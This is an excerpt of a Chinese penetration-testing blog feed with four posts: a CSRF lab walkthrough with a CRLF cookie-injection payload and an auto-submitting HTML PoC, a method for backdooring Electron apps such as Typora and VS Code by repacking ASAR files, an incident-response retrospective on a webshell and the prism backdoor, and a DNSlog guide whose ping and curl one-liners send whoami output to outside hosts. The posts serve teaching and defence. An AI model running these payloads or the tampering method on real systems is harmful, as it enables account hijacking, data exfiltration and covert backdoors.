src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-09.png" class="" title="2024-02-05_21-09.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>这里我们可以看到是存在一个 CSRF token 的，我们删了它看看是否会走校验</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-11.png" class="" title="2024-02-05_21-11.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>很遗憾，看来这个点还是有用的，尝试修改请求方法，看看这里我们能不能用 get 请求来修改邮箱呢</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-17.png" class="" title="2024-02-05_21-17.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-17_1.png" class="" title="2024-02-05_21-17_1.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>说明修改请求方法是成功的，可以绕过，我们继续删除后面的csrf参数，处理逻辑有没有变化，删除后发现也是可以成功修改的，这就说明当我们的请求方式改变之后，这个csrf参数的校验就失效了，于是我们就可以制作poc生成恶意攻击链接，并诱导受害者点击</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-22.png" class="" title="2024-02-05_21-22.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-24.png" class="" title="2024-02-05_21-24.png"><h4 id="未校验参数是否存在"><a href="#未校验参数是否存在" class="headerlink" title="未校验参数是否存在"></a>未校验参数是否存在</h4><p>这种漏洞出现的原因就是没有校验参数的完整性。通过观察数据包，如果修改关键参数并且不做校验，直接制作poc生成恶意攻击链接即可，这里就不赘述了</p><h4 id="使用公共的CSRF-token池"><a href="#使用公共的CSRF-token池" class="headerlink" title="使用公共的CSRF token池"></a>使用公共的CSRF token池</h4><p>这种情况是由于这个应用没有将一个用户的 session 和他的 CSRF token 进行绑定，而是做了一个公共的CSRF token池，只要是这个池里的 token，都是有效的，绕过的思路那就是直接自己登录上去获取到一个 token 即可绕过</p><p>这一次需要两个账号 wiener 和 carlos 来进行演示<br>首先登陆 wiener 并观察数据包，请求包还是一样的，但是发现通过用上面的方式已经绕不过去了。这里我们先记录一下wiener的token值，然后登出 wiener 登录 carlos 在修改邮箱的时候替换 CSRF 的值,发现修改成功，成功绕过</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-47.png" class="" title="2024-02-05_21-47.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>这就说明，用户每次修改邮箱的时候需要一个服务器下发的一次性 CSRF token，但这个 token 并没有与 session 绑定，而是从公共token池中提取的，那么我们就可以通过自己的账号来获取一个有效的 CSRF token 来绕过这个校验机制，只不过每次有用户上钩之后我们需要刷新这个 token 值</p><h4 id="token-直接在-cookie-中获取"><a href="#token-直接在-cookie-中获取" class="headerlink" title="token 直接在 cookie 中获取"></a>token 直接在 cookie 中获取</h4><p>这种情况下想要利用还需要有 CRLF 漏洞来配合，或者有其他的可以注入 cookie 的漏洞，使得你可以控制 cookie 的数据进而控制 csrf token 的数据</p><p>这次可以看到应该是走了双层验证，那么我们就需要一个地方来想办法注入 set-cookie，通过测试这里的搜索框存在 CRLF 漏洞，payload：%0d%0aSet-Cookie:%20csrf&#x3D;123456%3b%20SameSite&#x3D;None</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-58.png" class="" title="2024-02-05_21-58.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-02.png" class="" title="2024-02-05_22-02.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>那么我们就可以在自己的上构造一个响应，让它去请求刚才存在CRLF漏洞上的资源，然后发起一个请求来实现 CRLF 注入，之后再发送请求去修改邮箱就可以，首先还是用burpsuite先生成一个csrf的poc,然后对其修改：利用 img 标签去请求 web-security-academy.net（存在CRLF漏洞的完整URL）上的一个不存在的图片，当它发送这个请求的时候， web-security-academy.net 的 cookie 中的 csrf 键将被设置为 csrf&#x3D;123456，当请求失败的时候，就会提交我们的 CSRF 代码来修改邮箱</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://0a7c00ee0362ba6884d4dc8700fe006e.web-security-academy.net/my-account/change-email&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;111<span class="hljs-symbol">&amp;#64;</span>normal<span class="hljs-symbol">&amp;#45;</span>user<span class="hljs-symbol">&amp;#46;</span>net&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;csrf&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123456&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://0a7c00ee0362ba6884d4dc8700fe006e.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=123456%3b%20SameSite=None&quot;</span>  <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;document.forms[0].submit();&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-17.png" class="" title="2024-02-05_22-17.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-16.png" class="" title="2024-02-05_22-16.png"><h4 id="删除-referer-头"><a href="#删除-referer-头" class="headerlink" title="删除 referer 头"></a>删除 referer 头</h4><p>这次我们可以看到数据包中如果成功修改的话会自动跳转，同时请求包里有 referer 头，通常这种情况存在于开发人员在写代码的时候没有考虑到 referer 头不存在的情况下的处理逻辑，导致绕过了 referer 校验。但由于 referer 头是浏览器自动添加的请求头，所以通过上面的方式去要求 referer 头等于某个特定的值来绕过 referer 校验是不可行的，那我们看看把他改一下会是什么响应</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-28.png" class="" title="2024-02-05_22-28.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-29.png" class="" title="2024-02-05_22-29.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>这里报错是无效的 referer，那我们看看删了它会有什么响应</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-29_1.png" class="" title="2024-02-05_22-29_1.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><p>可以看到是成功的，那么下一步就是如何在 POC 里让它不发送 referer 头了，这就需要借助 meta 标签了（meta 标签用于提供关于 HTML 文档的元数据信息，也可以用来控制客户端发起请求的时候是否携带某个请求头），这里就是通过 meta 标签，来控制客户端发起请求不含 referer(no-referer)，payload如下</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-33.png" class="" title="2024-02-05_22-33.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-35.png" class="" title="2024-02-05_22-35.png"><h2 id="CSRF防范措施"><a href="#CSRF防范措施" class="headerlink" title="CSRF防范措施"></a>CSRF防范措施</h2><p>1、验证 HTTP Referer 字段<br>2、在请求地址中添加 token 并验证<br>3、在 HTTP 头中自定义属性并验证<br>4、浏览器端启用 SameSite cookie</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Electron投毒攻击的研究</title>
    <link href="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/"/>
    <url>/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是Electron？"><a href="#什么是Electron？" class="headerlink" title="什么是Electron？"></a>什么是Electron？</h2><p>Electron是由Github开发，用HTML，CSS和JavaScript来构建跨平台桌面应用程序的一个开源库。 Electron通过将Chromium和Node.js合并到同一个运行时环境中，并将其打包为Mac，Windows和Linux系统下的应用来实现这一目的。通过Node它提供了通常浏览器所不能提供的能力。一个基础的Electron包含三个文件：package.json（元数据）、main.js（代码）和index.html（图形用户界面）。框架由Electron可执行文件（Windows中为electron.exe、macOS中为electron.app、Linux中为electron）提供。开发者可以自行添加标志、自定义图标、重命名或编辑Electron可执行文件</p><p>Electron的优点：<br>兼容性：虽然你还在用WEB技术进行开发，但是你不用再考虑兼容性问题了，你只需要关心你当前使用Electron的版本对应Chrome的版本，一般情况下它已经足够新来让你使用最新的API和语法了，你还可以手动升级Chrome版本。同样的，你也不用考虑不同浏览器带的样式和代码兼容问题</p><p>NodeJS环境：这可能是很多前端开发者曾经梦想过的功能，在WEB界面中使用Node.js提供的强大API，这意味着你在WEB页面直接可以操作文件，调用系统API，甚至操作数据库。当然，除了完整的 Node API，你还可以使用额外的几十万个npm模块</p><p>跨域：你可以直接使用Node提供的request模块进行网络请求，这意味着你无需再被跨域所困扰</p><p>强大的扩展性：借助node-ffi，为应用程序提供强大的扩展性</p><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/Electron_20.0.3_screenshot.png" class="" title="Electron_20.0.3_screenshot.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>现在市面上已经有非常多的应用在使用Electron进行开发了，包括我们熟悉的VS Code客户端、GitHub客户端、Atom客户端等等</p><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/20230620170908414.png" class="" title="20230620170908414.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>参考文章：<br><a href="https://zhuanlan.zhihu.com/p/69109695">https://zhuanlan.zhihu.com/p/69109695</a><br><a href="https://zh.wikipedia.org/wiki/Electron#">https://zh.wikipedia.org/wiki/Electron#</a></p><h2 id="Electron投毒原理"><a href="#Electron投毒原理" class="headerlink" title="Electron投毒原理"></a>Electron投毒原理</h2><p>Electron通常是通过ASAR进行打包以及分发应用程序的。因为ASAR可以将与应用程序相关的所有文件以及目录单独打包成一个独立的文件，也就是.asar文件（通常在resources文件夹下面），所以它最大的优势在与可以在多平台运行。而Electron投毒则是通过对ASAR文件进行解包之后在源代码以及依赖中植入恶意代码，或者调试模式注入代码，从而实现恶意命令执行、植入后门木马等行为，而且Electron通常带有可信的数字签名，所以植入的恶意代码不会破坏签名校验</p><h2 id="攻击常用手法"><a href="#攻击常用手法" class="headerlink" title="攻击常用手法"></a>攻击常用手法</h2><h3 id="node-modules投毒"><a href="#node-modules投毒" class="headerlink" title="node_modules投毒"></a>node_modules投毒</h3><p>通过对Electron应用程序中的node_modules依赖项中植入恶意代码，应用程序运行时会被加载并执行恶意操作，接下来我以typora为例，typora为例是一款非常好用的markdown编辑器</p><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_10-18.png" class="" title="2024-02-04_10-18.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_10-17.png" class="" title="2024-02-04_10-17.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>typora安装目录下的resources文件夹有一个node_modules.asar，对它进行解包</p><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_10-19.png" class="" title="2024-02-04_10-19.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_10-29.png" class="" title="2024-02-04_10-29.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>然后在raven库中植入恶意代码，因为这个库会在打开typora时会被加载，这里我们通过触发计算器来模拟演示执行恶意代码的效果</p><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_10-39_1.png" class="" title="2024-02-04_10-39_1.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>保存后通过ASAR再打包回去<br>asar pack .&#x2F;node_modules_extract node_modules.asar<br>当我们重启typora的时候发现执行了恶意代码</p><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_10-42.png" class="" title="2024-02-04_10-42.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><h3 id="入口文件投毒"><a href="#入口文件投毒" class="headerlink" title="入口文件投毒"></a>入口文件投毒</h3><p>攻击者可以在应用的入口文件（如main.js等）中注入恶意代码，当应用程序启动时，这些代码会被执行。下面我以程序员常用的代码编辑器vscode来演示，找到vscode的应用配置文件package.json，通过查看main字段，发现入口文件为out目录下面的main</p><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_10-59.png" class="" title="2024-02-04_10-59.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>随后我们找到out目录下面的main,并植入恶意代码，保存完同样用ASAR再打包回去，重启vscode可以发现触发了恶意代码</p><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_11-03.png" class="" title="2024-02-04_11-03.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><img src="/2024/02/04/Electron%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E7%9A%84%E7%A0%94%E7%A9%B6/2024-02-04_11-05.png" class="" title="2024-02-04_11-05.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><h3 id="调试模式注入"><a href="#调试模式注入" class="headerlink" title="调试模式注入"></a>调试模式注入</h3><p>通过chrome的inspect功能实现在调试模式下注入恶意代码,可以直接参考开源项目：<a href="https://github.com/djerryz/electron_shell">https://github.com/djerryz/electron_shell</a></p>]]></content>
    
    
    <categories>
      
      <category>研究日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>test</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一次应急响应的模拟复盘</title>
    <link href="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/"/>
    <url>/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/</url>
    
    <content type="html"><![CDATA[<h2 id="事件背景"><a href="#事件背景" class="headerlink" title="事件背景"></a>事件背景</h2><p>某公司WebServer服务器遭到攻击者入侵，现疑似该服务器的应用系统被上传恶意软件或后门，很多重要文件被破坏，现启动网络安全事件应急响应，入手接管该服务器，发现攻击者放置的恶意软件或后门，分析还原攻击者如何入侵进服务器</p><h2 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h2><p>拿到服务器发现开放着80端口，是具有web端的，于是初步猜测，攻击者从web端入的手，拿到webshell,从而进一步攻击控制的服务器，于是看一下web日志，发现了apache文件夹，可以断定网页用的apache</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-20.png" class="" title="2024-02-03_16-20.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>查看apache日志文件夹，里面有多个日志文件，进行逐一查看，因为数据太大不方便查看与整理，我用本机进行ssh连接，将日志文件复刻下来，通过编辑器查看更方便些。</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-21.png" class="" title="2024-02-03_16-21.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>下载下来之后，开始进行日志分析，因为数据量太大、信息量太大，需要花很大的耐心，终于在184行发现了dirsearch攻击工具的痕迹，并且一直持续到9000多行，可以判断攻击者进行了目录扫描，并且攻击IP都指向了192.168.1.7（模拟环境）,因此我们得到了攻击者的IP</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-28.png" class="" title="2024-02-03_16-28.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-31.png" class="" title="2024-02-03_16-31.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>既然得到了攻击IP，通过定位IP得到了攻击者的ua头，攻击者用的Linux x86_64系统</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-29.png" class="" title="2024-02-03_16-29.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>略过大量的目录扫描日志数据，接着往下分析，在9203行附近发现路径参数里有个1.php文件，并且后面做了id , whoami , bash反弹shell的行为，这里可以判断攻击者进行了传马、命令执行、拿webshell的行为，重点是响应均为200,说明攻击成功，也就是说24&#x2F;Apr&#x2F;2022:15:26:42 这个时间打进来的</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-33.png" class="" title="2024-02-03_16-33.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-57.png" class="" title="2024-02-03_16-57.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>为了进一步验证，根据日志里路径，去apache目录里面找一下1.php文件是否存在，确认存在，cat一下，果然是一个典型的一句话木马，密码2022,所以前面的分析也得到了证实</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-34.png" class="" title="2024-02-03_16-34.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><p>将网站打包下载下来借助D盾扫一下，发现了隐藏木马footer.php</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-22.png" class="" title="2024-02-03_16-22.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>随后查看进程，发现有一个prism的进程，我的第一意识是ICMP反弹后门，为了得到进一步确认，通过进程的pid号追踪文件位置，发现在root目录下面并且还在隐藏文件夹内，并且通过查看文件属性，是一个elf可执行文件，就更可疑了</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-38.png" class="" title="2024-02-03_16-38.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-40.png" class="" title="2024-02-03_16-40.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_20-43.png" class="" title="2024-02-03_20-43.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><p>其实看到这里，心里八九不离十已经有答案了，为了得知真相，我们将这个elf可执行文件复刻一份到本机，进行样本逆向分析，果然在main函数里看到了key和路径，这也证实了是ICMP的反弹后门：prism</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-53.png" class="" title="2024-02-03_16-53.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-54.png" class="" title="2024-02-03_16-54.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>PRISM只有两个主文件，配置简单，能在Linux、Solaris、AIX、BSD&#x2F;Mac、Android等多个系统上运行，支持两种工作模式：ICMP 和 STATIC 模式<br>ICMP模式：<br>使用这种模式的后门将会在后台等待特定的包含主机&#x2F;端口连接信息的ICMP数据包，通过私有密钥可以阻止第三方访问。后门进程接受ping包激活<br>STATIC模式：<br>使用这种模式，后门主机将会主动尝试连接到指定端口的的IP地址上，所以只要在指定IP上监听指定端口等待连接就可以了。但是，缺点很明显，很任意暴露攻击者的IP地址，而且使用不够灵活。但是话说回来，两种工作模式、运行时进程重命名、不会监听端口、自动清除iptables规则表、采用C语言编写（代码仅有200来行），所以不需要任何库支持，所以prism作为一款迷你级的后门木马，还是很受欢迎的<br>正当我准备结束的时候，忽然在日志中发现了shodan 的痕迹，应该是攻击者资产收集所使用的平台</p><img src="/2024/02/03/%E4%B8%80%E6%AC%A1%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%A4%8D%E7%9B%98/2024-02-03_16-55.png" class="" title="2024-02-03_16-55.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>关机…</p>]]></content>
    
    
    <categories>
      
      <category>应急响应</category>
      
    </categories>
    
    
    <tags>
      
      <tag>蓝队</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令执行无回显下的数据外带</title>
    <link href="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/"/>
    <url>/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/</url>
    
    <content type="html"><![CDATA[<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>在注入时, 存在盲注或者延时, 我们获得需要数据就会频繁请求, 最后导致IP 被Ban,还有就是当我们进行命令执行的时候，目标站点什么也不显示,无法确定,所以用DNSlog外带可以减少请求并且直接回显数据<br>dnslog 数据外带通常用在以下情景：</p><p>1.SQL盲注<br>2.无回显的XSS<br>3.无回显的命令执行<br>5.无回显的SSRF<br>5.Blind XXE</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>将需要查询的值和域名拼接起来，向域名发送请求，便会传递到自己这里，然后通过读日志获取信息。为了方便理解，我自己模糊的做了一个原理图</p><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_10-36.png" class="" title="2024-02-03_10-36.png"><h2 id="Windows中的利用方式"><a href="#Windows中的利用方式" class="headerlink" title="Windows中的利用方式"></a>Windows中的利用方式</h2><h3 id="for-ping"><a href="#for-ping" class="headerlink" title="for + ping"></a>for + ping</h3><p>命令示例：for &#x2F;F “delims&#x3D;&quot; %i in (‘whoami’) do ping %i.xxx.dnslog.cn</p><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-40.png" class="" title="2024-02-03_09-40.png"><h3 id="for-curl"><a href="#for-curl" class="headerlink" title="for + curl"></a>for + curl</h3><p>命令示例：for &#x2F;F “delims&#x3D;&quot; %i in (‘whoami’) do curl <a href="http://192.168.43.190:8000/%i">http://192.168.43.190:8000/%i</a></p><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-42.png" class="" title="2024-02-03_09-42.png"><h3 id="用户名变量"><a href="#用户名变量" class="headerlink" title="%用户名变量%"></a>%用户名变量%</h3><p>直接通过%用户变量%来获取信息</p><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-56.png" class="" title="2024-02-03_09-56.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-51.png" class="" title="2024-02-03_09-51.png"><h2 id="Linux中的利用方式"><a href="#Linux中的利用方式" class="headerlink" title="Linux中的利用方式"></a>Linux中的利用方式</h2><h3 id="反引号-ping"><a href="#反引号-ping" class="headerlink" title="反引号 + ping"></a>反引号 + ping</h3><p>命令示例：ping <code>whoami</code>.foxd5a.dnslog.cn</p><img src="/2024/02/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E4%B8%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/2024-02-03_09-20.png" class="" title="2024-02-03_09-20.png"><h3 id="ping"><a href="#ping" class="headerlink" title="$() + ping"></a>$() + ping</h3><p>命令示例：ping $(whoami).dyy8n3.dnslog.cn</p><img 